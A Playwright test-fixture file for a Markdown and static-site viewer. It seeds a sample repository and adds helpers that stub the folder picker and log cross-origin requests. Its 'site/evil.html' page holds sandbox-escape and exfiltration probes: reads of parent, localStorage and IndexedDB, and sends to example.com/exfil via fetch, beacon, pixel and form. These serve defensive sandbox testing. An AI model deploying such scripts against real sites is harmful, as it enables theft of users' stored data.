import type { BrowserContext, Page } from "@playwright/test";

const PNG =
  "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==";

const long = Array.from(
  { length: 40 },
  (_, i) => `Paragraph ${i + 1} of filler text to scroll.`,
).join("\n\n");

/** A small repository: Markdown with relative links, images, SVG, code, anchors and a broken link. */
export const repoFixture: Record<string, string | { base64: string }> = {
  "README.md": `# Repo

Read the [guide](docs/guide.md) or jump to [its install section](docs/guide.md#install).
Browse [the docs folder](docs/).
See [the setup notes](guides/setup.md).

![Logo](img/logo.png)

![Diagram](img/diagram.svg)

\`\`\`ts
const answer: number = 42;
\`\`\`

## Overview

${long}

## Details

The end.
`,
  "docs/README.md": "# Docs index\n\nBack to [the root](../README.md).\n",
  "docs/guide.md": `# Guide

![Logo](../img/logo.png)

${long}

## Install

Run the installer. Back to [the readme](../README.md).
`,
  "docs/alerts.md": `# Alerts

> [!WARNING]
> Mind the **gap**.

> plain quote
`,
  "docs/api.html": "<!doctype html><title>API</title><h1>API</h1>",
  "img/logo.png": { base64: PNG },
  "img/diagram.svg":
    '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 8 8" width="8" height="8"><rect width="8" height="8" fill="#2F4B8A"/></svg>',
  "node_modules/dep/README.md": "# Should not appear",
  "site/index.html": `<!doctype html><html><head><meta charset="utf-8"><title>Site</title>
<link rel="stylesheet" href="style.css"></head><body>
<h1 id="h">Site home</h1>
<img id="png" src="img/dot.png" width="8" height="8" alt="dot">
<img id="svg" src="img/shape.svg" width="8" height="8" alt="shape">
<object id="obj" data="img/shape.svg" type="image/svg+xml" width="8" height="8"></object>
<p><a href="page2.html">Page two</a> <a href="../README.md">Back to the readme</a> <a href="https://example.com/">Outside</a></p>
<p id="out">scripts did not run</p>
<script>
  let storage;
  try {
    localStorage.setItem("site-toggle", "on");
    // The app keeps its theme under lectern.theme: a real storage would return it.
    storage = localStorage.getItem("lectern.theme") === null && localStorage.getItem("site-toggle") === "on" ? "in memory" : "SHARED";
  } catch (e) { storage = "blocked"; }
  document.body.dataset.ran = "yes";
  document.getElementById("out").textContent = "scripts ran; storage: " + storage;
</script>
</body></html>`,
  "site/style.css":
    "h1 { color: rgb(1, 2, 3); }\n@media (prefers-color-scheme: dark) { h1 { color: rgb(4, 5, 6); } }\n",
  "site/themed.html": `<!doctype html><html><head><meta charset="utf-8"><title>Themed</title>
<meta name="lectern-theme" content="on"></head>
<body class="lc-prose"><h1>Themed page</h1><div class="lc-notice lc-notice--warn"><p class="lc-notice__head">Heads up</p><p>Inside a notice.</p></div></body></html>`,
  "site/page2.html":
    '<!doctype html><title>Two</title><h1>Page two</h1><img src="img/dot.png" alt="dot">',
  "site/img/dot.png": { base64: PNG },
  "site/img/shape.svg":
    '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 8 8" width="8" height="8"><circle cx="4" cy="4" r="4"/></svg>',
  "site/evil.html": `<!doctype html><title>Evil</title><h1>Evil</h1>
<p id="out">nothing ran</p>
<img src="missing.png" onerror="document.title = 'onerror ran'">
<a id="js" href="javascript:document.title='js link ran'">click</a>
<iframe src="https://example.com/frame"></iframe>
<form id="f" action="https://example.com/post" method="post"><input name="q" value="secret"></form>
<script>
  const out = [];
  const attempt = async (name, fn) => { try { out.push(name + ": " + (await fn())); } catch (e) { out.push(name + ": blocked"); } };
  (async () => {
    await attempt("parent", () => parent.document.title);
    await attempt("storage", () => localStorage.getItem("lectern.theme") ?? "empty");
    await attempt("handles", () => new Promise((res, rej) => {
      const q = indexedDB.open("lectern"); q.onerror = () => rej(q.error);
      q.onsuccess = () => { try { const g = q.result.transaction("folders").objectStore("folders").getAll();
        g.onsuccess = () => res("GOT " + g.result.length); g.onerror = () => rej(g.error); } catch (e) { rej(e); } };
    }));
    await attempt("fetch", () => fetch("https://example.com/exfil").then((r) => r.status));
    await attempt("beacon", () => navigator.sendBeacon("https://example.com/beacon", "x"));
    await attempt("image", () => new Promise((res) => { const i = new Image(); i.onload = () => res("loaded"); i.onerror = () => res("failed"); i.src = "https://example.com/pixel.png"; }));
    await attempt("top", () => { top.location.href = "https://example.com/"; return "navigated"; });
    await attempt("form", () => { document.getElementById("f").submit(); return "submitted"; });
    document.getElementById("out").textContent = out.join("; ");
    document.body.dataset.done = "yes";
  })();
</script>`,
};

/**
 * Replaces the native folder picker (which automation cannot drive) with a real
 * FileSystemDirectoryHandle from the origin private file system, seeded with `files`.
 */
export async function stubFolderPicker(
  page: Page,
  files: Record<string, string | { base64: string }> = repoFixture,
  name = "repo",
): Promise<void> {
  await page.addInitScript(
    ({ files, name }) => {
      window.showDirectoryPicker = async () => {
        const opfs = await navigator.storage.getDirectory();
        const root = await opfs.getDirectoryHandle(name, { create: true });
        for (const [path, content] of Object.entries(files)) {
          const parts = path.split("/");
          const fileName = parts.pop()!;
          let dir = root;
          for (const part of parts) dir = await dir.getDirectoryHandle(part, { create: true });
          const writable = await (
            await dir.getFileHandle(fileName, { create: true })
          ).createWritable();
          await writable.write(
            typeof content === "string"
              ? content
              : Uint8Array.from(atob(content.base64), (c) => c.charCodeAt(0)),
          );
          await writable.close();
        }
        return root;
      };
    },
    { files, name },
  );
}

export async function openFixture(page: Page): Promise<void> {
  await stubFolderPicker(page);
  await page.goto("/");
  await page.getByRole("button", { name: "Open a folder…" }).click();
  await page.getByRole("heading", { level: 1, name: "Repo" }).waitFor();
}

/**
 * Records, and aborts, every request that would leave the app's origin.
 * Requests the browser blocks itself (CSP, sandbox) never get here, which is
 * the point: this lists what would actually reach the network.
 */
export async function blockForeignRequests(
  context: BrowserContext,
  origin: string,
): Promise<string[]> {
  const foreign: string[] = [];
  await context.route(
    (url) => url.origin !== origin && url.protocol !== "data:" && url.protocol !== "blob:",
    (route) => {
      foreign.push(route.request().url());
      void route.abort();
    },
  );
  return foreign;
}
